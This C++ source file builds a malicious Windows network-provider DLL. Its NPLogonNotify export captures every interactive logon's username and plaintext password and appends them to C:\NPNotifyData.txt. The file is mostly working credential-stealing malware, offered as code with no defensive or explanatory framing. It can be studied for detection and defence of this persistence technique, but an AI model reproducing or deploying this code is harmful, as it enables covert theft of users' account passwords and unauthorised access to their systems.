#include <Windows.h>

// from npapi.h
#define WNNC_SPEC_VERSION                0x00000001
#define WNNC_SPEC_VERSION51              0x00050001
#define WNNC_NET_TYPE                    0x00000002
#define WNNC_START                       0x0000000C
#define WNNC_STARTED					 0x00000001

//from ntdef.h
typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

// from NTSecAPI.h
typedef enum _MSV1_0_LOGON_SUBMIT_TYPE {
	MsV1_0InteractiveLogon = 2,
	MsV1_0Lm20Logon,
	MsV1_0NetworkLogon,
	MsV1_0SubAuthLogon,
	MsV1_0WorkstationUnlockLogon = 7,
	MsV1_0S4ULogon = 12,
	MsV1_0VirtualLogon = 82,
	MsV1_0NoElevationLogon = 83,
	MsV1_0LuidLogon = 84,
} MSV1_0_LOGON_SUBMIT_TYPE, * PMSV1_0_LOGON_SUBMIT_TYPE;

// from NTSecAPI.h
typedef struct _MSV1_0_INTERACTIVE_LOGON {
	MSV1_0_LOGON_SUBMIT_TYPE MessageType;
	UNICODE_STRING LogonDomainName;
	UNICODE_STRING UserName;
	UNICODE_STRING Password;
} MSV1_0_INTERACTIVE_LOGON, * PMSV1_0_INTERACTIVE_LOGON;

void SavePassword(PUNICODE_STRING username, PUNICODE_STRING password) {
	HANDLE hFile;
	DWORD dwWritten;

	hFile = CreateFile(TEXT("C:\\NPNotifyData.txt"),
		GENERIC_WRITE,
		0,
		NULL,
		OPEN_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		NULL);

	if (hFile != INVALID_HANDLE_VALUE) {
		SetFilePointer(hFile, 0, NULL, FILE_END);
		WriteFile(hFile, username->Buffer, username->Length, &dwWritten, 0);
		WriteFile(hFile, L" -> ", 8, &dwWritten, 0);
		WriteFile(hFile, password->Buffer, password->Length, &dwWritten, 0);
		WriteFile(hFile, L"\r\n", 4, &dwWritten, 0);
		CloseHandle(hFile);
	}
}

/*
 This tells MPR when a credential manager will start.
 By calling NPGetCaps with the nIndex parameter set to WNNC_START,
 the MPR gets the time to wait before calling the
 provider's credential management entry point functions.
 */
extern "C"
__declspec(dllexport)
DWORD APIENTRY NPGetCaps(DWORD nIndex) {
	switch (nIndex) {
	case WNNC_SPEC_VERSION:
		return WNNC_SPEC_VERSION51;

	case WNNC_NET_TYPE:
		return WNNC_CRED_MANAGER;

	/*Indicates that the provider is already started.*/
	case WNNC_START:
		return WNNC_STARTED;

	default:
		return 0;
	}
}

extern "C"
__declspec(dllexport)
DWORD APIENTRY NPLogonNotify(PLUID lpLogonId, LPCWSTR lpAuthInfoType,
	LPVOID lpAuthInfo, LPCWSTR lpPrevAuthInfoType,
	LPVOID lpPrevAuthInfo, LPWSTR lpStationName,
	LPVOID StationHandle, LPWSTR* lpLogonScript) {
	SavePassword (
		&(((MSV1_0_INTERACTIVE_LOGON*)lpAuthInfo)->UserName),
		&(((MSV1_0_INTERACTIVE_LOGON*)lpAuthInfo)->Password)
	);
	
	lpLogonScript = NULL;
	return WN_SUCCESS;
}

